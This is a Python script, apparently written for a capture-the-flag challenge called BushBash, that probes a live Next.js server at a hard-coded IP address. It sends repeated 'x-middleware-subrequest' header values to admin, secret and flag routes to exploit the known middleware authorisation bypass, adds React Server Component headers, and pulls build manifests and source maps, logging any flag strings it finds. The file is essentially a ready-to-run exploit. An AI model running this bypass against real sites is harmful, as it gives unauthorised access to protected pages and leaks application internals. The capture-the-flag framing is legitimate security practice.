#!/usr/bin/env python3

from __future__ import annotations

import base64
import hashlib
import json
import re
import time
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup, Comment


BASE_URL = "http://34.40.133.67:8080"
OUTPUT_DIR = Path("old-web-raw")
OUTPUT_FILE = OUTPUT_DIR / "result.json"
MAX_BODY_BYTES = 512 * 1024
USER_AGENT = "Mozilla/5.0 (compatible; BushBash-CTF-targeted-probe/1.0)"
FLAG_PATTERN = re.compile(rb"bushbash\{[^\r\n\x00}]{1,256}\}")

ROUTES = [
    "/",
    "/admin",
    "/admin/",
    "/dashboard",
    "/private",
    "/protected",
    "/secret",
    "/flag",
    "/internal",
    "/vault",
    "/api/flag",
    "/api/admin",
    "/api/secret",
]

MIDDLEWARE_VALUES = {
    "control": None,
    "middleware_once": "middleware",
    "middleware_five": ":".join(["middleware"] * 5),
    "src_middleware_five": ":".join(["src/middleware"] * 5),
    "pages_middleware_five": ":".join(["pages/_middleware"] * 5),
}

STATIC_PATHS = [
    "/_next/BUILD_ID",
    "/_next/static/nLUkWzLoBFZT61KFqWxQ0/_buildManifest.js",
    "/_next/static/nLUkWzLoBFZT61KFqWxQ0/_ssgManifest.js",
    "/_next/static/nLUkWzLoBFZT61KFqWxQ0/_middlewareManifest.json",
    "/_next/static/nLUkWzLoBFZT61KFqWxQ0/_routesManifest.json",
    "/_next/server/app-paths-manifest.json",
    "/_next/server/middleware-manifest.json",
    "/_next/static/chunks/webpack-5adebf9f62dc3001.js",
    "/_next/static/chunks/main-app-a7031ed1fe6ebaad.js",
    "/_next/static/chunks/517-0ec0e5f25493795c.js",
    "/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js",
]


def encode(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def parse_html(body: bytes, content_type: str) -> dict[str, Any] | None:
    if "html" not in content_type.lower() and not body.lstrip().startswith((b"<!DOCTYPE", b"<html", b"<HTML")):
        return None

    soup = BeautifulSoup(body.decode("utf-8", errors="replace"), "html.parser")
    return {
        "title": soup.title.string.strip() if soup.title and soup.title.string else None,
        "visible_text": "\n".join(soup.stripped_strings)[:131072],
        "links": sorted({str(tag.get("href")) for tag in soup.find_all("a", href=True)}),
        "scripts": sorted({str(tag.get("src")) for tag in soup.find_all("script", src=True)}),
        "comments": [str(item) for item in soup.find_all(string=lambda value: isinstance(value, Comment))],
        "forms": [
            {
                "action": form.get("action"),
                "method": form.get("method", "GET"),
                "inputs": [
                    {
                        "name": node.get("name"),
                        "type": node.get("type"),
                        "value": node.get("value"),
                    }
                    for node in form.find_all(["input", "button", "textarea", "select"])
                ],
            }
            for form in soup.find_all("form")
        ],
    }


def fetch(path: str, middleware_value: str | None, label: str, *, rsc: bool = False) -> dict[str, Any]:
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "*/*",
        "Connection": "close",
    }
    if middleware_value is not None:
        headers["x-middleware-subrequest"] = middleware_value
    if rsc:
        headers.update(
            {
                "RSC": "1",
                "Next-Router-Prefetch": "1",
                "Next-Router-State-Tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
            }
        )

    url = urljoin(BASE_URL + "/", path.lstrip("/"))
    started = time.monotonic()
    result: dict[str, Any] = {
        "path": path,
        "variant": label,
        "rsc": rsc,
        "request_headers": headers,
    }

    try:
        response = requests.get(
            url,
            headers=headers,
            timeout=(5, 15),
            allow_redirects=False,
        )
        complete_body = response.content
        body = complete_body[:MAX_BODY_BYTES]
        content_type = response.headers.get("Content-Type", "")
        flags = sorted({match.group(0).decode("ascii", errors="replace") for match in FLAG_PATTERN.finditer(complete_body)})
        result.update(
            {
                "elapsed_ms": round((time.monotonic() - started) * 1000, 2),
                "status": response.status_code,
                "reason": response.reason,
                "headers": dict(response.headers),
                "cookies": response.cookies.get_dict(),
                "body_length": len(complete_body),
                "body_sha256": hashlib.sha256(complete_body).hexdigest(),
                "body_b64": encode(body),
                "body_truncated": len(complete_body) > len(body),
                "flags": flags,
                "html": parse_html(body, content_type),
            }
        )
    except Exception as error:
        result["error"] = f"{type(error).__name__}: {error}"

    return result


def main() -> None:
    results: dict[str, Any] = {
        "target": BASE_URL,
        "middleware_tests": [],
        "static_files": [],
    }

    for path in ROUTES:
        for label, value in MIDDLEWARE_VALUES.items():
            results["middleware_tests"].append(fetch(path, value, label))

    for path in ("/", "/admin", "/dashboard", "/secret", "/flag"):
        results["middleware_tests"].append(fetch(path, MIDDLEWARE_VALUES["middleware_five"], "middleware_five_rsc", rsc=True))

    for path in STATIC_PATHS:
        results["static_files"].append(fetch(path, None, "static"))
        if path.endswith(".js"):
            results["static_files"].append(fetch(path + ".map", None, "source_map"))

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    OUTPUT_FILE.write_text(json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8")


if __name__ == "__main__":
    main()
